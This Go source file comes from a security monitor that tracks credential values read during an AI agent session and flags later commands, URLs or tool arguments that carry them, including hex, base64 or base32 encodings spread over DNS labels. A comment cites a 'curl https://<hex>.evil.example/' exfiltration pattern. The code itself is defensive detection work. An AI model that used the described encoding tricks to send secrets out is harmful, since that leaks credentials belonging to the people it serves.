package rules

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base32"
	"encoding/base64"
	"encoding/hex"
	"net/netip"
	"net/url"
	"regexp"
	"sort"
	"strings"
	"sync"
	"unicode/utf8"

	"golang.org/x/text/unicode/norm"

	"github.com/thomastysong/thomastysong/hawkbell/internal/classify"
	"github.com/thomastysong/thomastysong/hawkbell/internal/event"
	"github.com/thomastysong/thomastysong/hawkbell/internal/pathcanon"
)

// Data flow of credential VALUES within a session (research/threats.md
// section 4, S1; redteam/detection-quality.md section 9, precision control 2):
// when a tool result comes from a
// credential-class source, the engine keeps keyed fingerprints of the
// values in it; a later command, URL or MCP argument that carries one of
// those values (raw, URL-encoded, base64 or hex) sets session.secret_flow.
// Fingerprints are HMAC-SHA-256 under a random per-session salt, so the
// exported session state neither contains the values nor lets anyone match
// them across sessions or hosts.
//
// Host names are a channel of their own (DNS exfiltration: curl
// https://<hex>.evil.example/, dig, nslookup, ping). Every dotted name in
// the outbound text is also split into its labels: each label, long labels
// cut at the 63-byte DNS label limit, and runs of consecutive labels joined
// (an encoder spreads one value over several labels) are candidates, raw
// and decoded as hex, base64, base64url or base32. A raw label match counts
// only for values of 16 bytes or more that are credentials by format or by
// name: values kept only because they look machine generated are often
// identifiers (project refs, bucket names) that are legitimately used as
// subdomains, and short values collide with ordinary labels (measured: one
// 11-byte value in the benign replay). For the same reason a run of labels
// with its dots never matches a value that is itself a host name or URL
// (SESSION_COOKIE_DOMAIN, AUTH0_DOMAIN): every subdomain of it would.
//
// A name is split the way resolvers see it: IDNA processing (curl with
// libidn2, WHATWG URL parsers, Python's idna codec) maps the ideographic,
// full-width and half-width full stops to '.' and full-width letters and
// digits to ASCII before the query, so a name with any non-ASCII byte is
// also scanned in that form.

const (
	minSecretValue  = 8
	minLabelValue   = 16 // a raw DNS-label match needs a value at least this long
	maxSecretValue  = 4096
	maxSecretText   = 256 << 10 // secret-file output read for values: head and tail half each
	maxEnvLines     = 4096
	minValueEntropy = 3.0
)

// Bounds of the outbound scan. Every outbound string is scanned, shortest
// first, so a padding string sorts after the short value it is meant to
// hide; a string over flowTextScan is scanned on its head and tail. The
// candidate budget alone does not bound time: label padding ("a.a.a...")
// yields candidates that are never fingerprinted or decoded yet still
// cost a loop step and a lookup each, so every step of the scan is also
// charged to a work budget, and the engine stops the scan at half the
// per-event deadline whatever the budget says, so the rules always run.
// Hitting any bound sets session.secret_flow_truncated, so a padded
// request is never silently clean.
const (
	flowTextScan = 64 << 10 // longer strings: head and tail flowTextScan/2 each
	maxFlowBytes = 1 << 20  // bytes scanned per event
	maxFlowCands = 1 << 15  // distinct candidates fingerprinted or decoded per event
	maxFlowTexts = 1024     // MCP argument strings per event
	// maxFlowWork is the work budget of one event, in steps (see
	// flowScan.step). Measured: a step costs 8 to 17 ns on padding built
	// to be slow (about 25 ms for the whole budget of one-byte labels),
	// and the largest benign 1 MiB payloads tried (minified JavaScript,
	// JSON documents, CJK prose) use 0.1M to 1.5M steps.
	maxFlowWork = 3 << 20
	// flowClockEvery is how many steps pass between two readings of the
	// scan's clock.
	flowClockEvery = 1 << 12
)

// Fixed step costs of the work budget beyond the per-byte ones.
const (
	costNewCand     = 8  // a distinct candidate stored in the seen map
	costFingerprint = 48 // an HMAC of a candidate
	costDecode      = 8  // a set of decoding attempts
)

// envLine is compiled on first use, not at package initialisation: every
// process that links the package would pay for it.
var envLine = sync.OnceValue(func() *regexp.Regexp {
	return regexp.MustCompile(`^\s*(?:export\s+)?"?([A-Za-z_][A-Za-z0-9_.\-]{0,127})"?\s*[:=]\s*(.*?)\s*,?\s*$`)
})

var secretNameParts = []string{"KEY", "TOKEN", "SECRET", "PASS", "PWD", "AUTH", "CRED", "PRIVATE", "SESSION", "COOKIE", "SIGNATURE", "DSN", "CONN"}

func secretName(k string) bool {
	u := strings.ToUpper(k)
	for _, p := range secretNameParts {
		if strings.Contains(u, p) {
			return true
		}
	}
	return false
}

type secretValue struct {
	v, kind string
	weak    bool // kept for its entropy only (see secretFP.weak)
}

// secretValues extracts credential values from the output of a
// credential-class read: everything classify.FindSecrets recognises, plus
// the values of KEY=VALUE / "key": "value" lines whose name is secret-like
// or whose value looks machine generated (dotenv files, INI credential
// files, JSON key files).
func secretValues(text string) []secretValue {
	if len(text) > maxSecretText {
		text = cutHead(text, maxSecretText/2) + "\n" + cutTail(text, maxSecretText/2)
	}
	var out []secretValue
	seen := map[string]int{} // value -> index in out
	add := func(v, kind string, weak bool) {
		v = strings.TrimSpace(v)
		if len(v) < minSecretValue || len(v) > maxSecretValue {
			return
		}
		if i, ok := seen[v]; ok {
			if !weak {
				out[i].weak = false
			}
			return
		}
		seen[v] = len(out)
		out = append(out, secretValue{v, kind, weak})
	}
	for _, h := range classify.FindSecrets(text) {
		if h.Start >= 0 && h.End <= len(text) && h.Start < h.End {
			add(text[h.Start:h.End], h.Kind, false)
		}
	}
	lines := strings.SplitN(text, "\n", maxEnvLines+1)
	if len(lines) > maxEnvLines {
		lines = lines[:maxEnvLines]
	}
	re := envLine()
	for _, ln := range lines {
		m := re.FindStringSubmatch(ln)
		if m == nil {
			continue
		}
		v := strings.Trim(m[2], `"'`)
		if strings.ContainsAny(v, " \t") {
			continue
		}
		if named := secretName(m[1]); named || classify.Entropy(v) >= minValueEntropy {
			add(v, "env_value", !named)
		}
	}
	return out
}

func (s *sessionState) fingerprint(v string) string {
	return s.fingerprinter()(v)
}

// fingerprinter returns a function that fingerprints many values with one
// HMAC instance.
func (s *sessionState) fingerprinter() func(string) string {
	s.ensureSalt()
	m := hmac.New(sha256.New, s.salt)
	var buf [sha256.Size]byte
	return func(v string) string {
		m.Reset()
		m.Write([]byte(v))
		return hex.EncodeToString(m.Sum(buf[:0])[:12])
	}
}

// readsSecrets reports whether the event read a credential-class source.
func readsSecrets(f map[string]any) bool {
	if b, _ := f["path.sensitive_read"].(bool); b {
		return true
	}
	if cl, _ := f["shell.read_classes"].([]string); classify.IsSensitiveRead(cl) {
		return true
	}
	if ca, _ := f["shell.cred_access"].([]string); len(ca) > 0 {
		return true
	}
	if cl, _ := f["mcp.arg_path_classes"].([]string); classify.IsSensitiveRead(cl) {
		return true
	}
	return false
}

// captureSecrets records fingerprints of the credential values in the
// event's tool output when the event read a credential-class source.
func (s *sessionState) captureSecrets(ev *event.Event) {
	if ev.Content == nil || ev.Content.ToolOutput == "" || !readsSecrets(ev.Feat) {
		return
	}
	fp := s.fingerprinter()
	for _, sv := range secretValues(ev.Content.ToolOutput) {
		s.addSecret(fp(sv.v), sv.kind, len(sv.v), sv.weak)
	}
}

// outboundTexts returns the strings of the event that leave the machine:
// the command line of a shell command that contacts the network, the URL
// and query of a web tool, and every string argument of an MCP call; and
// whether the argument walk stopped at a bound.
func outboundTexts(ev *event.Event) ([]string, bool) {
	f := ev.Feat
	var out []string
	kind := event.ToolKind("")
	if ev.Tool != nil {
		kind = ev.Tool.Kind
	}
	if t := ev.Target; t != nil && t.Command != "" {
		hosts, _ := f["shell.hosts"].([]string)
		urls, _ := f["shell.urls"].([]string)
		nt, _ := f["shell.net_tools"].([]string)
		ex, _ := f["shell.exfil"].([]string)
		if len(hosts)+len(urls)+len(nt)+len(ex) > 0 {
			out = append(out, t.Command)
		}
	}
	cut := false
	switch kind {
	case event.ToolWebFetch, event.ToolWebSearch, event.ToolBrowser:
		if t := ev.Target; t != nil {
			out = append(out, t.URL, t.Query)
		}
		var in []string
		in, cut = inputStrings(ev, maxFlowTexts)
		out = append(out, in...)
	case event.ToolMCP:
		var in []string
		in, cut = inputStrings(ev, maxFlowTexts)
		out = append(out, in...)
	}
	return out, cut
}

// inputStrings returns up to limit string values of the tool input (depth
// 8), and whether it left any out.
func inputStrings(ev *event.Event, limit int) ([]string, bool) {
	if ev.Content == nil || len(ev.Content.ToolInput) == 0 {
		return nil, false
	}
	var out []string
	cut := false
	var walk func(v any, depth int)
	walk = func(v any, depth int) {
		if depth > 8 {
			cut = true
			return
		}
		switch t := v.(type) {
		case string:
			if len(out) >= limit {
				cut = true
				return
			}
			out = append(out, t)
		case map[string]any:
			keys := make([]string, 0, len(t))
			for k := range t {
				keys = append(keys, k)
			}
			sort.Strings(keys)
			for _, k := range keys {
				if len(out) >= limit {
					cut = true
					return
				}
				walk(t[k], depth+1)
			}
		case []any:
			for _, x := range t {
				if len(out) >= limit {
					cut = true
					return
				}
				walk(x, depth+1)
			}
		case []string:
			for _, x := range t {
				if len(out) >= limit {
					cut = true
					return
				}
				out = append(out, x)
			}
		}
	}
	walk(ev.Content.ToolInput, 0)
	return out, cut
}

// secretFlow returns the kinds of remembered credential values that appear
// in the event's outbound strings, whether anything was checked, and
// whether the scan stopped at a bound (some outbound text was not seen).
// stop, when not nil, is polled during the scan; once it reports true the
// scan ends as if a bound had been hit.
func (s *sessionState) secretFlow(ev *event.Event, stop func() bool) (kinds []string, checked, truncated bool) {
	kinds, checked, truncated, _ = s.secretFlowHits(ev, stop, false)
	return kinds, checked, truncated
}

// secretFlowHits is secretFlow; with collect it also returns, per
// remembered value found, the text that carries it (the token, the encoded
// token a decoding recovered it from, or the dotted name its labels came
// from) and the value's kind, so a caller that keeps that text can redact
// it.
func (s *sessionState) secretFlowHits(ev *event.Event, stop func() bool, collect bool) (kinds []string, checked, truncated bool, hits map[string]string) {
	if len(s.secrets) == 0 || len(s.salt) == 0 {
		return nil, false, false, nil
	}
	texts, truncated := outboundTexts(ev)
	if len(texts) == 0 {
		return nil, false, false, nil
	}
	want := make(map[string]secretFP, len(s.secrets))
	sc := &flowScan{budget: maxFlowCands, seen: map[string]uint8{}, stop: stop}
	for _, x := range s.secrets {
		want[x.fp] = x
		if x.n > 0 && x.n <= maxSecretValue {
			sc.setLen(x.n)
		} else {
			sc.anyLen = true // state from before lengths were recorded
		}
	}
	found := map[string]bool{}
	fp := s.fingerprinter()
	if collect {
		hits = map[string]string{}
		sc.collect = true
	}
	sc.match = func(c string, weakToo bool) {
		if x, ok := want[fp(c)]; ok && (weakToo || !x.weak) {
			found[x.kind] = true
			if hits != nil {
				if sc.root != "" {
					c = sc.root
				}
				hits[c] = x.kind
			}
		}
	}
	// Shortest first: a value hidden behind a long padding string is
	// reached before the padding spends the byte budget.
	sort.SliceStable(texts, func(i, j int) bool { return len(texts[i]) < len(texts[j]) })
	total := 0
scan:
	for _, t := range texts {
		if t == "" {
			continue
		}
		parts := []string{t}
		if len(t) > flowTextScan {
			parts = []string{cutHead(t, flowTextScan/2), cutTail(t, flowTextScan/2)}
			truncated = true
		}
		for _, p := range parts {
			if total+len(p) > maxFlowBytes {
				truncated = true
				break scan
			}
			total += len(p)
			flowCandidates(p, sc)
		}
	}
	// Then the labels of every dotted name the token pass met, shortest
	// name first, so neither a long padded name nor label padding can
	// spend the budget before the plain tokens were seen.
	sort.SliceStable(sc.names, func(i, j int) bool { return len(sc.names[i]) < len(sc.names[j]) })
	for _, n := range sc.names {
		if sc.exhausted {
			break
		}
		sc.labelCandidates(n)
	}
	truncated = truncated || sc.exhausted
	for k := range found {
		kinds = append(kinds, k)
	}
	sort.Strings(kinds)
	return kinds, true, truncated, hits
}

// cutHead returns at most n leading bytes of s without splitting a rune.
func cutHead(s string, n int) string {
	if len(s) <= n {
		return s
	}
	for n > 0 && !utf8.RuneStart(s[n]) {
		n--
	}
	return s[:n]
}

// cutTail returns at most n trailing bytes of s without splitting a rune.
func cutTail(s string, n int) string {
	if len(s) <= n {
		return s
	}
	i := len(s) - n
	for i < len(s) && !utf8.RuneStart(s[i]) {
		i++
	}
	return s[i:]
}

const coarseSep = " \t\r\n'\"`;|&<>(){}[],"

// Separator sets as byte tables (every separator is ASCII, so a byte scan
// never splits a multi-byte rune): coarse words, words split at key/value
// and URL punctuation, the same plus '/', and decoded text.
var (
	sepCoarse  = sepTable(coarseSep)
	sepKV      = sepTable("=:&?@#")
	sepKVPath  = sepTable("=:&?@#/")
	sepDecoded = sepTable(coarseSep + "=:")
)

func sepTable(seps string) *[256]bool {
	var t [256]bool
	for i := 0; i < len(seps); i++ {
		t[seps[i]] = true
	}
	return &t
}

// fields calls f with each maximal run of s that holds no separator byte.
func fields(s string, sep *[256]bool, f func(string)) {
	start := -1
	for i := 0; i < len(s); i++ {
		if sep[s[i]] {
			if start >= 0 {
				f(s[start:i])
				start = -1
			}
		} else if start < 0 {
			start = i
		}
	}
	if start >= 0 {
		f(s[start:])
	}
}

// flowScan carries the budgets of one event. A candidate is fingerprinted
// only when its length is the length of a remembered value, each distinct
// candidate is considered once per way it was found, and a candidate that
// can be neither fingerprinted nor decoded spends no candidate budget, so
// repeated or wrong-length padding cannot exhaust it. Time is bounded by
// the work budget instead: every loop step and every candidate looked up
// is charged to it (see step), useless ones included.
type flowScan struct {
	budget    int
	seen      map[string]uint8              // candidate -> what was done with it (seen* bits)
	lens      [maxSecretValue/64 + 1]uint64 // bit n: a remembered value is n bytes long
	anyLen    bool
	match     func(c string, weakToo bool)
	exhausted bool
	// work counts the steps charged so far; stop, when set, is polled
	// every flowClockEvery steps (at clockAt) and ends the scan.
	work, clockAt int
	stop          func() bool
	// names are the dotted tokens met by the token pass, for the label
	// pass; named dedups them. The rest is scratch space it reuses.
	names  []string
	named  map[string]bool
	labels [][2]int
	pieces []string
	ok64   []bool
	buf    []byte
	// With collect, root is the text a candidate under consideration was
	// derived from (a token being decoded, a dotted name being split).
	collect bool
	root    string
}

// step charges n units of work. It reports false, and marks the scan
// exhausted, once the work budget is spent or stop says time is up.
func (sc *flowScan) step(n int) bool {
	if sc.exhausted {
		return false
	}
	sc.work += n
	if sc.work > maxFlowWork {
		sc.exhausted = true
		return false
	}
	if sc.stop != nil && sc.work >= sc.clockAt {
		sc.clockAt = sc.work + flowClockEvery
		if sc.stop() {
			sc.exhausted = true
			return false
		}
	}
	return true
}

// isLen reports whether a candidate of n bytes could be a remembered value.
func (sc *flowScan) isLen(n int) bool {
	return sc.anyLen || n >= 0 && n <= maxSecretValue && sc.lens[n>>6]&(1<<(n&63)) != 0
}

func (sc *flowScan) setLen(n int) { sc.lens[n>>6] |= 1 << (n & 63) }

// What consider did with a candidate.
const (
	seenAll     uint8 = 1 << iota // fingerprinted against every remembered value
	seenStrong                    // fingerprinted against values that are credentials by format or name
	seenDecoded                   // base64 and hex decodings tried
	seenBase32                    // base32 decoding tried (labels only)
)

// candMode says where a candidate came from, which decides which
// remembered values it may match and whether it is decoded.
type candMode uint8

const (
	candToken   candMode = iota // a token of the outbound text: any value; decoded
	candDecoded                 // text a decoding produced: any value; not decoded again
	candLabel                   // a DNS label or consecutive labels run together: strong values raw; decoded, base32 too
	candDotted                  // consecutive labels with their dots: strong values raw; not decoded
)

// flowCandidates considers every substring of text that could be a whole
// credential value: tokens at three granularities, each also after URL,
// base64 and hex decoding (one level). Tokens with a dot are remembered
// for the label pass.
func flowCandidates(text string, sc *flowScan) {
	versions := []string{text}
	if strings.ContainsRune(text, '%') {
		if d, err := url.QueryUnescape(text); err == nil && d != text {
			versions = append(versions, d)
		}
	}
	for _, v := range versions {
		// Splitting at three granularities reads each byte several times.
		if !sc.step(len(v) >> 2) {
			return
		}
		fields(v, sepCoarse, func(tok string) {
			if sc.exhausted {
				return
			}
			sc.consider(tok, candToken)
			sc.noteName(tok)
			fields(tok, sepKV, func(sub string) {
				if sub != tok {
					sc.consider(sub, candToken)
					sc.noteName(sub)
				}
			})
			fields(tok, sepKVPath, func(sub string) {
				if sub != tok {
					sc.consider(sub, candToken)
					sc.noteName(sub)
				}
			})
		})
		if sc.exhausted {
			return
		}
	}
}

// maxFoldName is the longest token that is put through IDNA-style folding
// for the label pass; it leaves room for a 253-byte name written entirely
// in three-byte full-width characters.
const maxFoldName = 1 << 10

// noteName remembers a token that could be a host name for the label pass:
// the token as written when it has a dot, and its IDNA-folded form when
// folding changes it and yields a dot (an ideographic full stop between
// labels resolves like '.').
func (sc *flowScan) noteName(tok string) {
	if len(tok) < minSecretValue {
		return
	}
	if strings.IndexByte(tok, '.') >= 0 {
		sc.addName(tok)
	}
	if len(tok) <= maxFoldName && !isASCII(tok) && sc.step(1+len(tok)>>3) {
		if f := foldName(tok); f != tok && len(f) >= minSecretValue && strings.IndexByte(f, '.') >= 0 {
			sc.addName(f)
		}
	}
}

func (sc *flowScan) addName(n string) {
	if sc.named == nil {
		sc.named = map[string]bool{}
	}
	if !sc.named[n] {
		sc.named[n] = true
		sc.names = append(sc.names, n)
	}
}

// foldName maps a name the way IDNA processing (UTS #46, and the IDNA
// 2003 nameprep of Python's codec) does before a resolver sees it, as far
// as the label pass needs: NFKC turns full-width letters and digits into
// ASCII and the full-width, small and one-dot-leader stops into '.', and
// the ideographic and half-width ideographic full stops, which NFKC keeps,
// are label separators too. Case is kept, so a raw value still matches as
// written; bytes that are not UTF-8 are dropped.
func foldName(s string) string {
	return strings.Map(func(r rune) rune {
		switch r {
		case '\u3002', '\uFF0E', '\uFF61':
			return '.'
		case utf8.RuneError:
			return -1
		}
		return r
	}, norm.NFKC.String(s))
}

func isASCII(s string) bool {
	for i := 0; i < len(s); i++ {
		if s[i] >= utf8.RuneSelf {
			return false
		}
	}
	return true
}

// want returns what consider would do with a candidate of n bytes found
// in the given way (seen* bits), before the host-name test of dotted runs.
func (sc *flowScan) want(n int, mode candMode) uint8 {
	if n < minSecretValue || n > maxSecretValue {
		return 0
	}
	var w uint8
	if sc.isLen(n) {
		switch {
		case mode == candToken || mode == candDecoded:
			w = seenAll | seenStrong
		case n >= minLabelValue:
			// Raw in a host name: a short value ("staging-api") is as
			// likely an ordinary label as a leak.
			w = seenStrong
		}
	}
	if (mode == candToken || mode == candLabel) && n >= 12 {
		w |= seenDecoded // decodings need 12+ bytes
	}
	if mode == candLabel && n >= 13 {
		w |= seenBase32
	}
	return w
}

func (sc *flowScan) consider(c string, mode candMode) {
	want := sc.want(len(c), mode)
	if want == 0 {
		return // neither a possible value nor decodable
	}
	// Charges are weighted so that a unit of work costs about the same
	// whatever it is spent on (measured): a lookup hashes c, a new
	// candidate is copied into the map, a fingerprint is an HMAC and a
	// decoding allocates.
	if !sc.step(1 + len(c)>>4) {
		return
	}
	if mode == candDotted && hostShaped(c) {
		// A run of labels that reads as a host name is a parent domain
		// of the name it came from: a host-valued setting
		// (SESSION_COOKIE_DOMAIN=app.example.com) would match every one
		// of its subdomains, while a dotted credential (a JWT) never
		// ends in a top-level domain.
		return
	}
	have, ok := sc.seen[c]
	todo := want &^ have
	if todo == 0 {
		return // done already
	}
	if !ok {
		if sc.budget <= 0 {
			sc.exhausted = true
			return
		}
		if !sc.step(costNewCand) {
			return
		}
		sc.budget--
	}
	sc.seen[c] = have | todo
	if todo&(seenAll|seenStrong) != 0 {
		if !sc.step(costFingerprint + len(c)>>2) {
			return
		}
		sc.match(c, todo&seenAll != 0)
	}
	if todo&(seenDecoded|seenBase32) == 0 || !sc.step(costDecode+len(c)>>2) {
		return
	}
	if sc.collect && sc.root == "" {
		sc.root = c
		defer func() { sc.root = "" }()
	}
	for _, d := range decodings(c, todo&seenDecoded != 0, todo&seenBase32 != 0) {
		sc.consider(strings.TrimSpace(d), candDecoded)
		fields(d, sepDecoded, func(tok string) { sc.consider(tok, candDecoded) })
	}
}

// Bounds of the label pass over one dotted name.
const (
	maxDNSLabel      = 63  // longer labels are also cut into pieces of this size
	maxLabelRun      = 16  // labels or pieces run together into one candidate
	maxLabelRunBytes = 512 // bytes of one run (a DNS name is at most 253)
)

// labelCandidates considers the labels of a dotted name: every label (a
// label over 63 bytes also in 63-byte pieces) and every run of up to 16
// consecutive pieces joined without the dots, raw and decoded, because an
// encoder that spreads one value over several labels is undone by
// concatenation; and every run of up to 16 whole labels with its dots,
// raw, for a value that has dots of its own (a JWT). Each run is a step of
// the work budget whether or not it becomes a candidate, so a name of
// thousands of one-byte labels costs a bounded, charged amount of time.
func (sc *flowScan) labelCandidates(name string) {
	if !sc.step(1 + len(name)>>2) { // splitting and classifying the labels
		return
	}
	if sc.collect && sc.root == "" {
		sc.root = name
		defer func() { sc.root = "" }()
	}
	labels := sc.labels[:0] // [start, end) of each label, empty ones included
	defer func() { sc.labels = labels[:0] }()
	start := 0
	for i := 0; i <= len(name); i++ {
		if i == len(name) || name[i] == '.' {
			labels = append(labels, [2]int{start, i})
			start = i + 1
		}
	}
	if len(labels) < 2 {
		return
	}
	for i := 0; i < len(labels); i++ {
		for j := i + 1; j < len(labels) && j-i < maxLabelRun; j++ {
			if !sc.step(1) {
				return
			}
			a, b := labels[i][0], labels[j][1]
			if b-a > maxLabelRunBytes {
				break
			}
			// The whole name was a token of its own; a run of another
			// length cannot be a remembered value.
			if (i > 0 || j < len(labels)-1) && b-a >= minLabelValue && sc.isLen(b-a) {
				sc.consider(name[a:b], candDotted)
			}
		}
	}
	pieces := sc.pieces[:0]
	for _, l := range labels {
		p := name[l[0]:l[1]]
		for len(p) > maxDNSLabel {
			pieces = append(pieces, p[:maxDNSLabel])
			p = p[maxDNSLabel:]
		}
		if p != "" {
			pieces = append(pieces, p)
		}
	}
	ok64 := sc.ok64[:0]
	for _, p := range pieces {
		ok64 = append(ok64, isBase64ish(p))
	}
	buf := sc.buf[:0]
	defer func() { sc.pieces, sc.ok64, sc.buf = pieces[:0], ok64[:0], buf[:0] }()
	for i := range pieces {
		if !sc.step(1) {
			return
		}
		sc.consider(pieces[i], candLabel)
		buf = append(buf[:0], pieces[i]...)
		dec := ok64[i]
		for j := i + 1; j < len(pieces) && j-i < maxLabelRun; j++ {
			if !sc.step(1) {
				return
			}
			if len(buf)+len(pieces[j]) > maxLabelRunBytes {
				break
			}
			buf = append(buf, pieces[j]...)
			dec = dec && ok64[j]
			// Materialise the run only when it could be a value or decode
			// to text holding one, and not again once that was done (the
			// lookup with string(buf) does not allocate).
			if !sc.isLen(len(buf)) && !(dec && len(buf) >= 12) {
				continue
			}
			w := sc.want(len(buf), candLabel)
			if w == 0 {
				continue
			}
			if !sc.step(len(buf) >> 4) {
				return
			}
			if have, ok := sc.seen[string(buf)]; ok && w&^have == 0 {
				continue
			}
			sc.consider(string(buf), candLabel)
		}
	}
}

// base32NoPad decodes the base32 that DNS tunnels use (RFC 4648, no
// padding; labels are case-insensitive, so input is upper-cased first).
var base32NoPad = base32.StdEncoding.WithPadding(base32.NoPadding)

// decodings returns c decoded as base64 (any alphabet) or hex (with b64hex)
// and as base32 (with dns), when it decodes to text. Of the base64 decoders the
// first that yields text is used, in the order standard, raw standard,
// URL, raw URL; decoders that must fail on c are not tried (each attempt
// allocates): a '-' or '_' rules out the standard alphabet, a '+' or '/'
// the URL one, '=' the raw forms and a length that is not a multiple of 4
// the padded ones, and without '-', '_', '+' and '/' the URL decoders
// decode exactly as the standard ones already did.
func decodings(c string, b64hex, dns bool) []string {
	var out []string
	if b64hex && len(c) >= 12 && isBase64ish(c) {
		std, url := true, true
		pad := false
		for i := 0; i < len(c); i++ {
			switch c[i] {
			case '-', '_':
				std = false
			case '+', '/':
				url = false
			case '=':
				pad = true
			}
		}
		var encs [2]*base64.Encoding
		switch {
		case std && url, std:
			encs = [2]*base64.Encoding{base64.StdEncoding, base64.RawStdEncoding}
		case url:
			encs = [2]*base64.Encoding{base64.URLEncoding, base64.RawURLEncoding}
		}
		for i, enc := range encs {
			raw := i == 1
			if enc == nil || raw && pad || !raw && len(c)%4 != 0 {
				continue
			}
			if b, err := enc.DecodeString(c); err == nil && printable(b) {
				out = append(out, string(b))
				break
			}
		}
	}
	if b64hex && len(c) >= 16 && len(c)%2 == 0 && hexDigits(c) {
		if b, err := hex.DecodeString(c); err == nil && printable(b) {
			out = append(out, string(b))
		}
	}
	if dns && len(c) >= 13 && isBase32ish(c) {
		if b, err := base32NoPad.DecodeString(strings.ToUpper(strings.TrimRight(c, "="))); err == nil && printable(b) {
			out = append(out, string(b))
		}
	}
	return out
}

// hostShaped reports whether s reads as a host name, bare or as the host
// of a URL (scheme, userinfo, port and path are set aside; a leading dot,
// as in a cookie domain, and a trailing one are ignored): an IP address,
// or two or more labels of 1 to 63 letters, digits, '-' and '_' whose last
// is a plausible top-level domain, 2 to 24 letters or an xn-- A-label.
// Dotted credentials fail the last test: a JWT ends in a signature of 43
// or more mixed characters.
func hostShaped(s string) bool {
	if i := strings.Index(s, "://"); i > 0 && isScheme(s[:i]) {
		s = s[i+3:]
	}
	if i := strings.IndexAny(s, "/?#"); i >= 0 {
		s = s[:i]
	}
	if i := strings.LastIndexByte(s, '@'); i >= 0 {
		s = s[i+1:]
	}
	if i := strings.LastIndexByte(s, ':'); i >= 0 && i+1 < len(s) && digits(s[i+1:]) {
		s = s[:i]
	}
	s = strings.TrimSuffix(strings.TrimPrefix(s, "."), ".")
	if s == "" || len(s) > 253 {
		return false
	}
	if _, err := netip.ParseAddr(s); err == nil {
		return true
	}
	n, last := 0, ""
	for s != "" {
		l := s
		if i := strings.IndexByte(s, '.'); i >= 0 {
			l, s = s[:i], s[i+1:]
			if s == "" {
				return false // an empty label
			}
		} else {
			s = ""
		}
		if l == "" || len(l) > maxDNSLabel {
			return false
		}
		for i := 0; i < len(l); i++ {
			c := l[i]
			if !(c >= 'a' && c <= 'z' || c >= 'A' && c <= 'Z' || c >= '0' && c <= '9' || c == '-' || c == '_') {
				return false
			}
		}
		n++
		last = l
	}
	if n < 2 {
		return false
	}
	if len(last) > 4 && strings.EqualFold(last[:4], "xn--") {
		return true
	}
	if len(last) < 2 || len(last) > 24 {
		return false
	}
	for i := 0; i < len(last); i++ {
		if c := last[i] | 0x20; c < 'a' || c > 'z' {
			return false
		}
	}
	return true
}

// isScheme reports whether s is a URL scheme (RFC 3986: a letter, then
// letters, digits, '+', '-' and '.').
func isScheme(s string) bool {
	for i := 0; i < len(s); i++ {
		c := s[i]
		if !(c >= 'a' && c <= 'z' || c >= 'A' && c <= 'Z' || i > 0 && (c >= '0' && c <= '9' || c == '+' || c == '-' || c == '.')) {
			return false
		}
	}
	return s != ""
}

func digits(s string) bool {
	for i := 0; i < len(s); i++ {
		if s[i] < '0' || s[i] > '9' {
			return false
		}
	}
	return s != ""
}

func hexDigits(s string) bool {
	for i := 0; i < len(s); i++ {
		c := s[i]
		if !(c >= '0' && c <= '9' || c >= 'a' && c <= 'f' || c >= 'A' && c <= 'F') {
			return false
		}
	}
	return true
}

func isBase64ish(s string) bool {
	for i := 0; i < len(s); i++ {
		c := s[i]
		if !(c >= 'A' && c <= 'Z' || c >= 'a' && c <= 'z' || c >= '0' && c <= '9' || c == '+' || c == '/' || c == '=' || c == '-' || c == '_') {
			return false
		}
	}
	return true
}

func isBase32ish(s string) bool {
	for i := 0; i < len(s); i++ {
		c := s[i]
		if !(c >= 'A' && c <= 'Z' || c >= 'a' && c <= 'z' || c >= '2' && c <= '7' || c == '=') {
			return false
		}
	}
	return true
}

func printable(b []byte) bool {
	if len(b) == 0 || !utf8.Valid(b) {
		return false
	}
	for _, c := range b {
		if c < 0x20 && c != '\n' && c != '\r' && c != '\t' {
			return false
		}
	}
	return true
}

// pathDigest normalizes a path lexically (home expansion, cwd join, clean,
// case folding where the filesystem folds) and hashes it, so "./run.sh",
// "run.sh" and "/repo/run.sh" in the same session compare equal.
func pathDigest(p, cwd, home, goos string) string {
	p = strings.Trim(strings.TrimSpace(p), `"'`)
	if p == "" || len(p) > 4096 {
		return ""
	}
	win := goos == "windows"
	p = strings.ReplaceAll(p, `\`, "/")
	switch {
	case p == "~" || strings.HasPrefix(p, "~/"):
		if home == "" {
			return ""
		}
		p = strings.ReplaceAll(home, `\`, "/") + p[1:]
	case strings.HasPrefix(p, "$HOME/") || strings.HasPrefix(p, "${HOME}/"):
		if home == "" {
			return ""
		}
		p = strings.ReplaceAll(home, `\`, "/") + p[strings.IndexByte(p, '/'):]
	}
	abs := strings.HasPrefix(p, "/") || (len(p) >= 2 && p[1] == ':')
	if !abs {
		if cwd == "" {
			return ""
		}
		p = strings.ReplaceAll(cwd, `\`, "/") + "/" + p
	}
	// The canonical form (pathcanon) also strips /proc/<pid>/root, so a
	// script written through /proc/self/root and run by its plain path (or
	// the other way round) is the same file. Separators stay "/" so that
	// digests in session state from earlier versions still compare.
	p, _ = pathcanon.Clean(p, pathcanon.Options{})
	p = strings.ReplaceAll(p, `\`, "/")
	if win || goos == "darwin" {
		p = strings.ToLower(p)
	}
	sum := sha256.Sum256([]byte(p))
	return hex.EncodeToString(sum[:8])
}

// execPaths returns the paths an event executes.
func execPaths(ev *event.Event) []string {
	var out []string
	if l, ok := ev.Feat["shell.executes_paths"].([]string); ok {
		out = append(out, l...)
	}
	if ev.Type == event.TypeProcessExec && ev.Process != nil && ev.Process.Exe != "" {
		out = append(out, ev.Process.Exe)
	}
	return out
}

// writtenPaths returns the paths an event writes: file tool targets, shell
// redirections and copy destinations, and the path arguments of an MCP
// tool whose name says it writes.
func writtenPaths(ev *event.Event) []string {
	var out []string
	if ev.Tool != nil {
		switch ev.Tool.Kind {
		case event.ToolFileWrite, event.ToolFileEdit:
			if t := ev.Target; t != nil {
				if t.Path != "" {
					out = append(out, t.Path)
				}
				out = append(out, t.Paths...)
			}
		case event.ToolMCP:
			name := strings.ToLower(ev.Tool.MCPTool)
			for _, w := range []string{"write", "create", "edit", "save", "put", "upload", "move", "copy"} {
				if strings.Contains(name, w) {
					if l, ok := ev.Feat["mcp.arg_paths"].([]string); ok {
						out = append(out, l...)
					}
					break
				}
			}
		}
	}
	if l, ok := ev.Feat["shell.writes"].([]string); ok {
		out = append(out, l...)
	}
	return out
}
